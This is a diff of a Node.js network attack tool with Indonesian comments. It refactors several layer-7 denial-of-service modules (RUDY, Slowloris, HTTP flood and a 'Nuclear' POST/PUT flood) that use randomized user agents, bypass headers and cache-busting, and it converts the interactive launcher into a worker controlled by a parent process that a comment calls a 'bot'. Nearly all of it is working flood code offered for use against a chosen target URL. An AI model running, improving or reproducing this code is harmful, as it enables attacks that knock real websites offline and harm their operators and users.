@@ -1,10 +1,6 @@
 const http = require('http');
 const https = require('https');
 const { URL } = require('url');
-const cluster = require('cluster');
-const os = require('os');
-const chalk = require('chalk');
-const inquirer = require('inquirer');
 
 const userAgents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
@@ -112,12 +108,13 @@ class BypassGenerator {
 }
 
 class RudyAttack {
-    constructor(targetUrl, threadCount, stats) {
+    constructor(targetUrl, threadCount, stats, bypasser) {
         this.targetUrl = targetUrl;
         this.threadCount = threadCount;
         this.stats = stats;
         this.sockets = [];
         try {
+            this.bypasser = bypasser;
             this.url = new URL(targetUrl);
             this.protocol = this.url.protocol === 'https:' ? https : http;
         } catch (e) { this.url = null; this.protocol = null; }
@@ -126,8 +123,7 @@ class RudyAttack {
     createConnection() {
         if (!this.url) return null;
         this.stats.total++;
-        const bypasser = new BypassGenerator();
-        const headers = bypasser.generateHeaders();
+        const headers = this.bypasser.generateHeaders();
         headers['Content-Type'] = 'application/x-www-form-urlencoded';
         headers['Content-Length'] = 1000000 + Math.floor(Math.random() * 500000);
         headers['Connection'] = 'keep-alive';
@@ -191,12 +187,13 @@ class RudyAttack {
 }
 
 class SlowlorisAttack {
-    constructor(targetUrl, threadCount, stats) {
+    constructor(targetUrl, threadCount, stats, bypasser) {
         this.targetUrl = targetUrl;
         this.threadCount = threadCount;
         this.stats = stats;
         this.sockets = [];
         try {
+            this.bypasser = bypasser;
             this.url = new URL(targetUrl);
             this.protocol = this.url.protocol === 'https:' ? https : http;
         } catch (e) { this.url = null; this.protocol = null; }
@@ -205,8 +202,7 @@ class SlowlorisAttack {
     createConnection() {
         if (!this.url) return null;
         this.stats.total++;
-        const bypasser = new BypassGenerator();
-        const headers = bypasser.generateHeaders();
+        const headers = this.bypasser.generateHeaders();
         headers['Connection'] = 'keep-alive';
 
         const options = {
@@ -271,12 +267,13 @@ class SlowlorisAttack {
 }
 
 class L7Flood {
-    constructor(targetUrl, threadCount, delay, stats) {
+    constructor(targetUrl, threadCount, delay, stats, bypasser) {
         this.targetUrl = targetUrl;
         this.threadCount = threadCount;
         this.delay = delay;
         this.stats = stats;
         this._running = false;
+        this.bypasser = bypasser;
         try {
             this.url = new URL(targetUrl);
             this.protocol = this.url.protocol === 'https:' ? https : http;
@@ -290,8 +287,7 @@ class L7Flood {
         const method = getRandomElement(methods);
         const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
         const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
-        const bypasser = new BypassGenerator();
-        const headers = bypasser.generateHeaders();
+        const headers = this.bypasser.generateHeaders();
         const options = {
             hostname: this.url.hostname,
             port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
@@ -303,7 +299,7 @@ class L7Flood {
 
         let requestBody = null;
         if (['POST', 'PUT'].includes(method)) {
-            const payload = bypasser.generatePayload();
+            const payload = this.bypasser.generatePayload();
             requestBody = payload.body;
             options.headers['Content-Type'] = payload.contentType;
             options.headers['Content-Length'] = Buffer.byteLength(payload.body);
@@ -347,8 +343,7 @@ class NuclearFlood extends L7Flood {
         const method = getRandomElement(['POST', 'PUT']); // Only use heavy methods
         const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
         const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
-        const bypasser = new BypassGenerator();
-        const headers = bypasser.generateHeaders();
+        const headers = this.bypasser.generateHeaders();
         const options = {
             hostname: this.url.hostname,
             port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
@@ -376,13 +371,7 @@ class NuclearFlood extends L7Flood {
     }
 }
 
-function updateDisplay(stats) {
-    const rate = stats.total > 0 ? (stats.success / stats.total * 100).toFixed(2) : '0.00';
-    const statusLine = `Status: ${chalk.yellow(stats.phase)} | Requests: ${chalk.blue(stats.total)} (Success: ${chalk.green(stats.success)}, Failed: ${chalk.red(stats.failed)}) | Rate: ${chalk.magenta(rate + '%')} `;
-    process.stdout.write(statusLine + '\r');
-}
-
-async function startWorkerAttack({ targetUrl, duration }) {
+process.on('message', ({ targetUrl, duration }) => {
     const threads = 100;
     const l7Delay = 200; // Not used for timing, but for constructor compatibility
     const allAttackModes = ['RUDY', 'L7 Flood', 'Slowloris', 'Nuclear Flood'];
@@ -393,19 +382,23 @@ async function startWorkerAttack({ targetUrl, duration }) {
         [allAttackModes[i], allAttackModes[j]] = [allAttackModes[j], allAttackModes[i]];
     }
 
-    if (cluster.worker.id === 1) {
-        console.log(chalk.cyan(`\n[+] Worker ${cluster.worker.id} (Display) starting attack on ${targetUrl} | Duration: ${duration}s`));
-        console.log(chalk.cyan(`[+] Attack Order: ${allAttackModes.join(chalk.red(' -> '))}`));
-    }
-    
-    const stats = {
-        total: 0,
-        success: 0,
-        failed: 0,
-        phase: 'Initializing...',
-    };
+    const bypasser = new BypassGenerator();
 
-    const displayInterval = cluster.worker.id === 1 ? setInterval(() => updateDisplay(stats), 200) : null;
+    // Kirim statistik ke proses induk setiap detik
+    setInterval(() => {
+        // Hanya kirim jika ada data baru untuk dilaporkan
+        if (stats.total > 0 || stats.success > 0 || stats.failed > 0) {
+            if (process.send) { // Pastikan proses induk masih ada
+                process.send({ type: 'stats', data: { ...stats } });
+            }
+            // Reset penghitung setelah mengirim
+            stats.total = 0;
+            stats.success = 0;
+            stats.failed = 0;
+        }
+    }, 1000);
+
+    const stats = { total: 0, success: 0, failed: 0, phase: 'Initializing...' };
     const totalDurationMs = duration * 1000;
     const phaseDurationMs = totalDurationMs / allAttackModes.length;
     let currentAttacker = null;
@@ -416,15 +409,7 @@ async function startWorkerAttack({ targetUrl, duration }) {
         }
 
         if (phaseIndex >= allAttackModes.length) {
-            if (displayInterval) {
-                clearInterval(displayInterval);
-                updateDisplay(stats);
-                process.stdout.write('\n');
-            }
-            if (cluster.worker.id === 1) {
-                console.log(chalk.bold.green('Attack rotation finished.'));
-            }
-            process.exit(0);
+            // Proses induk (bot) akan mematikan worker ini, tidak perlu keluar secara eksplisit.
             return;
         }
 
@@ -432,10 +417,10 @@ async function startWorkerAttack({ targetUrl, duration }) {
         stats.phase = `${attackMode} Attack`;
 
         switch (attackMode) {
-            case 'RUDY': currentAttacker = new RudyAttack(targetUrl, threads, stats); break;
-            case 'L7 Flood': currentAttacker = new L7Flood(targetUrl, threads, l7Delay, stats); break;
-            case 'Slowloris': currentAttacker = new SlowlorisAttack(targetUrl, threads, stats); break;
-            case 'Nuclear Flood': currentAttacker = new NuclearFlood(targetUrl, threads, l7Delay, stats); break;
+            case 'RUDY': currentAttacker = new RudyAttack(targetUrl, threads, stats, bypasser); break;
+            case 'L7 Flood': currentAttacker = new L7Flood(targetUrl, threads, l7Delay, stats, bypasser); break;
+            case 'Slowloris': currentAttacker = new SlowlorisAttack(targetUrl, threads, stats, bypasser); break;
+            case 'Nuclear Flood': currentAttacker = new NuclearFlood(targetUrl, threads, l7Delay, stats, bypasser); break;
         }
 
         if (currentAttacker) {
@@ -445,47 +430,4 @@ async function startWorkerAttack({ targetUrl, duration }) {
     };
 
     executeAttackPhase(0);
-}
-
-if (cluster.isMaster) {
-    const numCPUs = os.cpus().length;
-    console.log(chalk.bold.red('===================================================='));
-    console.log(chalk.bold.red('     Alat Serangan Jaringan - Gunakan Dengan Bijak    '));
-    console.log(chalk.bold.red(`     Master process is running. Forking for ${numCPUs} CPUs.`));
-    console.log(chalk.bold.red('====================================================\n'));
-
-    const questions = [
-        { type: 'input', name: 'targetUrl', message: 'Masukkan URL Target:', validate: (val) => { try { new URL(val); return true; } catch { return 'URL tidak valid.'; } } },
-        { type: 'number', name: 'duration', message: 'Masukkan Durasi Serangan (detik):', default: 60, validate: (val) => val > 0 || 'Durasi harus lebih dari 0.' },
-    ];
-
-    inquirer.prompt(questions).then(async ({ targetUrl, duration }) => {
-        try {
-
-            const attackConfig = {
-                targetUrl,
-                duration,
-            };
-
-            for (let i = 0; i < numCPUs; i++) {
-                const worker = cluster.fork();
-                worker.on('online', () => worker.send(attackConfig));
-            }
-
-            cluster.on('exit', (worker, code, signal) => {
-                if (signal) {
-                    console.log(chalk.magenta(`Worker ${worker.process.pid} was killed by signal: ${signal}`));
-                } else if (code !== 0) {
-                    console.log(chalk.magenta(`Worker ${worker.process.pid} exited with error code: ${code}`));
-                }
-            });
-        } catch (err) {
-            console.error(chalk.red('\n\nTerjadi kesalahan fatal:'), err);
-            process.exit(1);
-        }
-    });
-} else { // Worker process
-    process.on('message', (attackConfig) => {
-        startWorkerAttack(attackConfig);
-    });
-}
+});
